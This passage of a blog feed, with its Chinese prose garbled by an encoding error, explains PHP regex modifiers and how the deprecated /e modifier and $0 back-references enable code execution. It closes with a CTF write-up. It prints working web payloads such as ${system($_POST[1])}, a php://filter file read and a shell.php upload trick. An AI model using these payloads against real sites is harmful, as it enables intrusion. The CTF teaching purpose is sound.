id="s-PCRE-DOTALL"><a href="#s-PCRE-DOTALL" class="headerlink" title="s (PCRE_DOTALL)"></a><strong>s (PCRE_DOTALL)</strong></h3><p>ä½¿å¾—<code>.</code>å¯ä»¥åŒ¹é…æ¢è¡Œç¬¦</p><p>å¦‚æœè®¾ç½®äº†è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œæ¨¡å¼ä¸­çš„ç‚¹å·<code>(.)</code>å­—ç¬¦åŒ¹é…æ‰€æœ‰çš„å­—ç¬¦ï¼Œ<strong>åŒ…å«æ¢è¡Œç¬¦</strong>ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œç‚¹å·ä¸åŒ¹é…æ¢è¡Œç¬¦ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519221410216.png" alt loading="lazy"></p><h3 id="D-PCRE-DOLLAR-ENDONLY"><a href="#D-PCRE-DOLLAR-ENDONLY" class="headerlink" title="D (PCRE_DOLLAR_ENDONLY)"></a><strong>D (PCRE_DOLLAR_ENDONLY)</strong></h3><p>ä½¿å¾—<code>$</code>ä¸åŒ¹é…æ¢è¡Œç¬¦</p><p>å¦‚æœè®¾ç½®äº†è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œæ¨¡å¼ä¸­çš„å…ƒå­—ç¬¦ç¾å…ƒç¬¦å·<code>($)</code>ï¼Œä»…ä»…åŒ¹é…ç›®æ ‡å­—ç¬¦ä¸²çš„æœ«å°¾ï¼Œå¦‚æœè¿™ä¸ªä¿®é¥°ç¬¦æ²¡æœ‰è®¾ç½®ï¼Œå½“å­—ç¬¦ä¸²ä»¥ä¸€ä¸ªæ¢è¡Œç¬¦ç»“å°¾æ—¶ï¼Œç¾å…ƒç¬¦å·è¿˜ä¼šåŒ¹é…è¯¥æ¢è¡Œç¬¦<strong>(ä½†ä¸ä¼šåŒ¹é…ä¹‹å‰çš„ä»»ä½•æ¢è¡Œç¬¦)</strong>ï¼Œå¦‚æœè®¾ç½®äº†ä¿®é¥°ç¬¦<em>m</em>ï¼Œè¿™ä¸ªä¿®é¥°ç¬¦è¢«å¿½ç•¥ã€‚å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520165220099.png" alt loading="lazy"></p><h3 id="x-PCRE-EXTENDED"><a href="#x-PCRE-EXTENDED" class="headerlink" title="x (PCRE_EXTENDED)"></a><strong>x (PCRE_EXTENDED)</strong></h3><p>ä½¿å¾—å¯ä»¥åœ¨æ¨¡å¼ä¸­æ·»åŠ æ³¨é‡Š</p><p>å¦‚æœè®¾ç½®äº†è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œæ¨¡å¼ä¸­çš„æ²¡æœ‰ç»è¿‡è½¬ä¹‰çš„æˆ–ä¸åœ¨å­—ç¬¦ç±»ä¸­çš„ç©ºç™½æ•°æ®å­—ç¬¦æ€»ä¼šè¢«å¿½ç•¥ï¼Œå¹¶ä¸”ä½äºä¸€ä¸ªæœªè½¬ä¹‰çš„å­—ç¬¦ç±»å¤–éƒ¨çš„#å­—ç¬¦å’Œä¸‹ä¸€ä¸ªæ¢è¡Œç¬¦ä¹‹é—´çš„å­—ç¬¦ä¹Ÿè¢«å¿½ç•¥ã€‚æ³¨æ„ï¼šè¿™ä»…ç”¨äºæ•°æ®å­—ç¬¦ã€‚ ç©ºç™½å­—ç¬¦è¿˜æ˜¯ä¸èƒ½åœ¨æ¨¡å¼çš„ç‰¹æ®Šå­—ç¬¦åºåˆ—ä¸­å‡ºç°ã€‚å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520171421233.png" alt loading="lazy"></p><h3 id="e-PREG-REPLACE-EVAL"><a href="#e-PREG-REPLACE-EVAL" class="headerlink" title="e (PREG_REPLACE_EVAL)"></a><strong>e (PREG_REPLACE_EVAL)</strong></h3><p>è¿™ä¸ªåŠŸèƒ½åœ¨php5.5.0ä¸­å·²å¼ƒç”¨ï¼Œåœ¨php7.0.0ä¸­å·²åˆ é™¤</p><p>å¦‚æœè®¾ç½®äº†è¿™ä¸ªè¢«å¼ƒç”¨çš„ä¿®é¥°ç¬¦ï¼Œ<a href="https://www.php.net/manual/zh/function.preg-replace.php">preg_replace()</a> åœ¨è¿›è¡Œäº†å¯¹æ›¿æ¢å­—ç¬¦ä¸²çš„åå‘å¼•ç”¨æ›¿æ¢ä¹‹å, å°†æ›¿æ¢åçš„å­—ç¬¦ä¸²ä½œä¸º<code>php</code>ä»£ç è¯„ä¼°æ‰§è¡Œ(<code>eval</code>å‡½æ•°æ–¹å¼)ï¼Œå¹¶ä½¿ç”¨æ‰§è¡Œç»“æœ ä½œä¸ºå®é™…å‚ä¸æ›¿æ¢çš„å­—ç¬¦ä¸²ã€‚å•å¼•å·ã€åŒå¼•å·ã€åæ–œçº¿<code>(\)</code>å’Œ NULL å­—ç¬¦åœ¨åå‘å¼•ç”¨æ›¿æ¢æ—¶ä¼šè¢«ç”¨åæ–œçº¿è½¬ä¹‰ã€‚ä»¥ä¸‹æ˜¯å…¸å‹çš„ä¸€ç§åˆ©ç”¨æ–¹æ³•</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520173908256.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520174020072.png" alt loading="lazy"></p><p>è™½ç„¶ä¼ å…¥å¼•å·ä¼šè¢«è½¬ä¹‰ï¼Œä½†æ˜¯è¿™å¹¶ä¸ä¼šå½±å“æˆ‘ä»¬<code>getshell</code>ï¼Œä»¤ç¬¬ä¸‰ä¸ªå‚æ•°ä¸º<code>&#123;$&#123;system($_POST[1])&#125;&#125;</code>å³å¯<code>POST</code>å‘½ä»¤æ‰§è¡Œå‚æ•°ï¼Œè¿™é‡Œæ³¨æ„éœ€è¦åŒ¹é…åˆ°<code>$&#123;&#125;</code>è¿™ç§ç±»ä¼¼çš„ç¬¦å·åŒ…è£¹ç€ä»£ç çš„æ‰èƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ˜¯å› ä¸º<a href="http://php.net/manual/zh/language.variables.variable.php">PHPå¯å˜å˜é‡</a>çš„åŸå› ï¼Œ<code>$&#123;&#125;</code>ä¸­åŒ…è£¹çš„å­—ç¬¦åˆ™ä¼šå½“åšä»£ç æ‰§è¡Œ</p><h3 id="A-PCRE-ANCHORED"><a href="#A-PCRE-ANCHORED" class="headerlink" title="A (PCRE_ANCHORED)"></a><strong>A (PCRE_ANCHORED)</strong></h3><p>å¦‚æœè®¾ç½®äº†è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œæ¨¡å¼è¢«å¼ºåˆ¶ä¸ºâ€é”šå®šâ€æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯è¯´çº¦æŸåŒ¹é…ä½¿å…¶ä»…ä» ç›®æ ‡å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®æœç´¢ã€‚è¿™ä¸ªæ•ˆæœåŒæ ·å¯ä»¥ä½¿ç”¨é€‚å½“çš„æ¨¡å¼æ„é€ å‡ºæ¥(å¦‚ï¼š<code>^</code>)ã€‚ç®€å•æ¥è®²å°±æ˜¯è¡¨è¾¾å¼å¿…é¡»æ˜¯åŒ¹é…å­—ç¬¦ä¸²ä¸­çš„å¼€å¤´éƒ¨åˆ†</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520175528269.png" alt loading="lazy"></p><h3 id="U-PCRE-UNGREEDY"><a href="#U-PCRE-UNGREEDY" class="headerlink" title="U(PCRE_UNGREEDY)"></a><strong>U(PCRE_UNGREEDY)</strong></h3><p>è¿™ä¸ªä¿®é¥°ç¬¦é€†è½¬äº†é‡è¯çš„â€è´ªå©ªâ€æ¨¡å¼ã€‚ å¦‚æœä½¿ç”¨è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œä¼šä½¿é‡è¯é»˜è®¤ä¸ºéè´ªå©ªçš„ï¼Œé€šè¿‡é‡è¯åç´§è·Ÿ<code>?</code>çš„æ–¹å¼å¯ä»¥ä½¿å…¶æˆä¸ºè´ªå©ªçš„ã€‚é€†è½¬è´ªå©ªåŠŸèƒ½</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/phpæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¿®é¥°ç¬¦/image-20200520182001826.png" style="zoom: 67%;" loading="lazy"><h3 id="X-PCRE-EXTRA"><a href="#X-PCRE-EXTRA" class="headerlink" title="X(PCRE_EXTRA)"></a><strong>X(PCRE_EXTRA)</strong></h3><p>è¿™ä¸ªä¿®é¥°ç¬¦æ‰“å¼€äº† PCRE ä¸ perl ä¸å…¼å®¹çš„é™„ä»¶åŠŸèƒ½ã€‚æ¨¡å¼ä¸­çš„ä»»æ„åæ–œçº¿åå°± ingen ä¸€ä¸ª æ²¡æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦éƒ½ä¼šå¯¼è‡´ä¸€ä¸ªé”™è¯¯ï¼Œä»¥æ­¤ä¿ç•™è¿™äº›å­—ç¬¦ä»¥ä¿è¯å‘åå…¼å®¹æ€§ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨ perl ä¸­ï¼Œåæ–œçº¿ç´§è·Ÿä¸€ä¸ªæ²¡æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦è¢«è®¤ä¸ºæ˜¯è¯¥å­—ç¬¦çš„åŸæ–‡ã€‚ å½“å‰æ²¡æœ‰å…¶ä»–ç‰¹æ€§ç”±è¿™ä¸ªä¿®é¥°ç¬¦æ§åˆ¶ã€‚</p><h3 id="J-PCRE-INFO-JCHANGED"><a href="#J-PCRE-INFO-JCHANGED" class="headerlink" title="J(PCRE_INFO_JCHANGED)"></a><strong>J(PCRE_INFO_JCHANGED)</strong></h3><p>å†…éƒ¨é€‰é¡¹è®¾ç½®<code>(?J)</code>ä¿®æ”¹æœ¬åœ°çš„<em>PCRE_DUPNAMES</em>é€‰é¡¹ã€‚å…è®¸å­ç»„é‡åã€‚ (è¯‘æ³¨ï¼šåªèƒ½é€šè¿‡å†…éƒ¨é€‰é¡¹è®¾ç½®ï¼Œå¤–éƒ¨çš„ <code>/J</code> è®¾ç½®ä¼šäº§ç”Ÿé”™è¯¯ã€‚)</p><h3 id="u-PCRE-UTF8"><a href="#u-PCRE-UTF8" class="headerlink" title="u(PCRE_UTF8)"></a><strong>u(PCRE_UTF8)</strong></h3><p>æ­¤ä¿®æ­£ç¬¦æ‰“å¼€ä¸€ä¸ªä¸ <code>perl</code> ä¸å…¼å®¹çš„é™„åŠ åŠŸèƒ½ã€‚æ¨¡å¼å’Œç›®æ ‡å­—ç¬¦ä¸²éƒ½è¢«è®¤ä¸ºæ˜¯<code>utf-8</code>çš„ã€‚ æ— æ•ˆçš„ç›®æ ‡å­—ç¬¦ä¸²ä¼šå¯¼è‡´ <code>preg_*</code> å‡½æ•°ä»€ä¹ˆéƒ½åŒ¹é…ä¸åˆ°ï¼› æ— æ•ˆçš„æ¨¡å¼å­—ç¬¦ä¸²ä¼šå¯¼è‡´ <code>E_WARNING</code> çº§åˆ«çš„é”™è¯¯ã€‚PHP5.3.4 åï¼Œ5å­—èŠ‚å’Œ6å­—èŠ‚çš„ UTF-8 å­—ç¬¦åºåˆ—è¢«è€ƒè™‘ä¸ºæ— æ•ˆ<code>(resp. PCRE 7.3 2007-08-28)</code>ã€‚ ä»¥å‰å°±è¢«è®¤ä¸ºæ˜¯æ— æ•ˆçš„ UTF-8ã€‚</p><h3 id="S"><a href="#S" class="headerlink" title="S"></a><strong>S</strong></h3><p>å½“ä¸€ä¸ªæ¨¡å¼éœ€è¦å¤šæ¬¡ä½¿ç”¨çš„æ—¶å€™ï¼Œä¸ºäº†å¾—åˆ°åŒ¹é…é€Ÿåº¦çš„æå‡ï¼Œå€¼å¾—èŠ±è´¹ä¸€äº›æ—¶é—´ å¯¹å…¶è¿›è¡Œä¸€äº›é¢å¤–çš„åˆ†æã€‚å¦‚æœè®¾ç½®äº†è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œè¿™ä¸ªé¢å¤–çš„åˆ†æå°±ä¼šæ‰§è¡Œã€‚å½“å‰ï¼Œ è¿™ç§å¯¹ä¸€ä¸ªæ¨¡å¼çš„åˆ†æä»…ä»…é€‚ç”¨äºéé”šå®šæ¨¡å¼çš„åŒ¹é…(å³æ²¡æœ‰å•ç‹¬çš„å›ºå®šå¼€å§‹å­—ç¬¦)ã€‚</p><h3 id="åŒ¹é…æ¢è¡Œé—®é¢˜"><a href="#åŒ¹é…æ¢è¡Œé—®é¢˜" class="headerlink" title="$åŒ¹é…æ¢è¡Œé—®é¢˜"></a><strong>$åŒ¹é…æ¢è¡Œé—®é¢˜</strong></h3><p>åœ¨å¤šè¡Œæ¨¡å¼ä¸‹ï¼Œå› ä¸ºæ˜¯å¤šè¡Œæ¨¡å¼ï¼Œæ‰€ä»¥<code>$</code>å¯ä»¥åŒ¹é…æ¯ä¸€è¡Œçš„ç»“å°¾ï¼Œä¸”ä¸ä¼šåŒ¹é…æ¢è¡Œç¬¦</p><p>åœ¨å•è¡Œæ¨¡å¼ä¸‹ï¼Œå°†æ•´ä¸ªæ–‡æœ¬è§†ä¸ºä¸€è¡Œï¼Œæ‰€ä»¥<code>$</code>åŒ¹é…çš„æ˜¯æ–‡æœ¬çš„ç»“å°¾ï¼Œä¸”åŒ…æ‹¬ç»“å°¾çš„æ¢è¡Œç¬¦</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520163746726.png" alt loading="lazy"></p><p>ä¾‹å¦‚Apacheçš„æ¢è¡Œè§£ææ¼æ´ï¼Œå› ä¸º<code>$</code>èƒ½åŒ¹é…<code>\n</code>ï¼Œæ‰€ä»¥ä¸Šä¼ <code>shell.php\n</code>ï¼Œä»ç„¶å¯ä»¥è®©Apacheè§£æphpæ–‡ä»¶</p><p>é‚£ä¹ˆè¯¥å¦‚ä½•è§£å†³è¿™ç§é—®é¢˜å‘¢ï¼Ÿ</p><p>åœ¨phpä¸­æœ‰ä¸€ä¸ªä¿®é¥°ç¬¦<code>D</code>ï¼Œ<code>D</code>æ˜¯phpä¸­ç‹¬æœ‰çš„ä¿®é¥°ç¬¦ï¼Œå…¶ä½œç”¨æ˜¯å‘Šè¯‰å¼•æ“<code>$</code>ä»…åŒ¹é…æ–‡æœ¬ç»“å°¾ï¼Œä¸å†åŒ¹é…åˆ°ä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œåœ¨phpä¸­å¯ä»¥ç”¨<code>D</code>ä¿®é¥°ç¬¦æ¥è§£å†³é—®é¢˜ï¼Œé‚£ä¹ˆä¸åœ¨phpç¯å¢ƒä¸‹å‘¢ï¼Ÿåœ¨æ­¤ä¹‹å‰å°±éœ€è¦å±¡ä¸€ä¸‹æ­£åˆ™ä¸­å…·æœ‰â€œé¦–å°¾â€ç•Œå®šç¬¦æ„æ€çš„å­—ç¬¦ï¼š</p><ul><li><code>^</code></li><li><code>$</code></li><li><code>\A</code></li><li><code>\Z</code></li><li><code>\z</code></li></ul><p>ç¬¬ä¸‰ä¸ª<code>\A</code>è¡¨ç¤ºâ€œå­—ç¬¦ä¸²çš„å¼€å¤´â€ï¼Œç¬¬å››ä¸ª<code>\Z</code>è¡¨ç¤ºè¡Œçš„ç»“å°¾ï¼Œå…¶æ•ˆæœå…¶å®å’Œ<code>$</code>å®Œå…¨ä¸€æ ·ï¼Œç¬¬äº”ä¸ª<code>\z</code>ï¼Œè¡¨ç¤ºâ€œå­—ç¬¦ä¸²çš„ç»“å°¾â€ï¼Œæ‰€ä»¥<code>\A</code>å’Œ<code>\z</code>è¿™ä¸¤ä¸ªç•Œå®šç¬¦æ‰æ˜¯çœŸæ­£è¡¨ç¤ºâ€œå­—ç¬¦ä¸²å¼€å¤´â€å’Œâ€œå­—ç¬¦ä¸²ç»“å°¾â€çš„ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520170351144.png" alt loading="lazy"></p><h3 id="æ­£åˆ™æ›¿æ¢"><a href="#æ­£åˆ™æ›¿æ¢" class="headerlink" title="æ­£åˆ™æ›¿æ¢"></a><strong>æ­£åˆ™æ›¿æ¢</strong></h3><p>åˆ©ç”¨<code>$0</code>æ¥è¿›è¡Œæ­£åˆ™æ›¿æ¢ä½¿ç¬¦å·é€ƒé€¸</p><p>æœ‰å¦‚ä¸‹ä»£ç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$api</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'api'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./option.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\$API = '.*';/s"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\$API = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$api</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./option.php'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>æˆ‘ä»¬å¯ä»¥å¯¹<code>option.php</code>è¿›è¡Œå†™æ“ä½œï¼Œä¸‹é¢çœ‹å¦‚ä½•åˆ©ç”¨<code>$0</code>æ¥ç»•è¿‡è¿™ä¸ªæ­£åˆ™çš„é™åˆ¶</p><p>ä¼ å…¥<code>?api=;phpinfo();</code>ï¼Œ<code>option.php</code>ä¸­çš„å†…å®¹å˜æˆäº†</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$API</span> <span class="token operator">=</span> <span class="token string single-quoted-string">';phpinfo();'</span><span class="token punctuation">;</span></span></code></pre><p>å†ä¼ å…¥<code>?api=$0</code>ï¼Œ<code>option.php</code>ä¸­çš„å†…å®¹å˜æˆäº†</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$API</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'$API = '</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">;</span></span></code></pre><p>æˆåŠŸä½¿å¾—å•å¼•å·é€ƒé€¸ï¼Œé€ æˆä»£ç æ‰§è¡Œï¼Œ$0ç­‰çš„ä½¿ç”¨æ–¹æ³•ï¼š</p><ul><li><code>$1</code>è¡¨ç¤ºæ•è·ç»„1ï¼Œ<code>$0</code>è¡¨ç¤ºæ•´ä¸ªåŒ¹é…ç»„ã€‚</li><li>å¦‚æœ<code>$1</code>åé¢ç´§æ¥ä¸€ä¸ªæ•°å­—ï¼Œåˆ™éœ€è¦å†™æˆ<code>\$&#123;1&#125;</code>çš„å½¢å¼ã€‚</li></ul><p>å†æ¥çœ‹çœ‹<code>preg_replace</code>çš„å…·ä½“ä½¿ç”¨æ–¹æ³•</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/phpæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¿®é¥°ç¬¦/image-20200520192912940.png" style="zoom: 80%;" loading="lazy"><h3 id="å·¨äººçš„è‚©è†€"><a href="#å·¨äººçš„è‚©è†€" class="headerlink" title="å·¨äººçš„è‚©è†€"></a><strong>å·¨äººçš„è‚©è†€</strong></h3><ul><li><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html">ç»å…¸å†™é…ç½®æ¼æ´ä¸å‡ ç§å˜å½¢</a></li><li><a href="https://www.smi1e.top/%e5%b0%8f%e5%af%86%e5%9c%88%e7%bb%8f%e5%85%b8%e5%86%99%e9%85%8d%e7%bd%ae%e6%bc%8f%e6%b4%9e%e4%b8%8e%e5%87%a0%e7%a7%8d%e5%8f%98%e5%bd%a2%e5%ad%a6%e4%b9%a0/">[å°å¯†åœˆ]ç»å…¸å†™é…ç½®æ¼æ´ä¸å‡ ç§å˜å½¢å­¦ä¹ </a></li><li><a href="https://xz.aliyun.com/t/2557">æ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ</a></li><li><a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php">PHPæ¨¡å¼ä¿®é¥°ç¬¦</a></li></ul><h3 id="æ —å­"><a href="#æ —å­" class="headerlink" title="æ —å­"></a><em>æ —å­</em></h3><h4 id="BJDCTF2020-ZJCTFâ€”ä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFâ€”ä¸è¿‡å¦‚æ­¤" class="headerlink" title="BJDCTF2020-ZJCTFâ€”ä¸è¿‡å¦‚æ­¤"></a><strong>BJDCTF2020-ZJCTFâ€”ä¸è¿‡å¦‚æ­¤</strong></h4><p>é¦–å…ˆé¢˜ç›®å…ˆç»™å‡ºäº†ä¸€æ®µä»£ç ï¼š</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phperror_reporting(0);$text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;I have a dream&quot;))&#123;    echo (file_get_contents($text,&#39;r&#39;));    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;        die(&quot;Not now!&quot;);    &#125;    include($file);  &#x2F;&#x2F;next.php    &#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>æ„é€ <code>payload</code>è¯»å–<code>next.php</code>çš„å†…å®¹</p><pre class="language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//e4d6525b-eb85-41c7-9bbb-f48802a4eb3a.node3.buuoj.cn</span><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain;base64,SSBoYXZlIGEgZHJlYW0=</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=next.php</span></code></pre><p>å°†è¯»åˆ°çš„base64è§£ç å¾—åˆ°<code>next.php</code>æ–‡ä»¶çš„å†…å®¹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        <span class="token variable">$str</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>çœ‹åˆ°äº†<code>complex</code>æ–¹æ³•ä¸­çš„<code>preg_replace</code>å‡½æ•°ï¼Œé‡Œé¢çš„æ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨äº†<code>e</code>ä¿®é¥°ç¬¦ï¼Œåˆ©ç”¨ä¸Šé¢çš„åŸç†æ„é€ ï¼š</p><p><code>payload</code>ï¼š<code>?\S*=$&#123;system($_POST[1])&#125;</code>   POST:<code>1=cat /flag;</code>å³å¯æ‹¿åˆ°<code>flag</code>ï¼Œ</p><p>ä¹Ÿå¯ä»¥åˆ©ç”¨é‡Œé¢çš„<code>getFlag</code>æ–¹æ³•<code>?\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=highlight_file(&#39;/flag&#39;);</code>ä¹Ÿå¯ä»¥æ‹¿åˆ°<code>flag</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;phpå•åŒå¼•å·çš„åŒºåˆ«ï¼š&lt;/p&gt;
&lt;p&gt;å•å¼•å·ï¼šphpä¸ä¼šè¯»å–é‡Œé¢çš„å˜é‡ï¼Œä½œä¸ºçº¯å­—ç¬¦ä¸²å¤„ç†&lt;/p&gt;
&lt;p&gt;åŒå¼•å·ï¼šPHPä¼šå°è¯•è¯»å–é‡Œé¢çš„å˜é‡ï¼Œæˆ–è€…åæ–œæ è¡¨ç¤ºçš„ç‰¹æ®Šç¬¦å·ï¼Œä¾‹å¦‚&lt;code&gt;\n&lt;/code&gt;ï¼Œ&lt;code&gt;\0&lt;/code&gt;ç­‰&lt;/p&gt;
&lt;p&gt;å¤„ç†å­—ç¬¦ä¸²å˜é‡æ›¿æ¢çš„è¿æ¥é€Ÿåº¦æ–¹é¢ï¼Œphp7å‰å•å¼•å·ä¼šå¿«äº›ï¼Œè€Œåœ¨php7ä¹‹åå°±æ²¡åŒºåˆ«äº†ï¼Œ&lt;a href=&quot;https://www.laruence.com/2008/08/19/338.html&quot;&gt;è¯¦è§&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="å¤‡å¿˜å½•" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="æ­£åˆ™" scheme="https://www.extrader.top/tags/%E6%AD%A3%E5%88%99/"/>
    
  </entry>
  
  <entry>
    <title>CISCN-LoveMath-phpåŠ¨æ€å‡½æ•°æ‰§è¡Œ</title>
    <link href="https://www.extrader.top/posts/a649e496/"/>
    <id>https://www.extrader.top/posts/a649e496/</id>
    <published>2020-05-17T09:53:48.000Z</published>
    <updated>2020-07-14T12:52:02.649Z</updated>
    
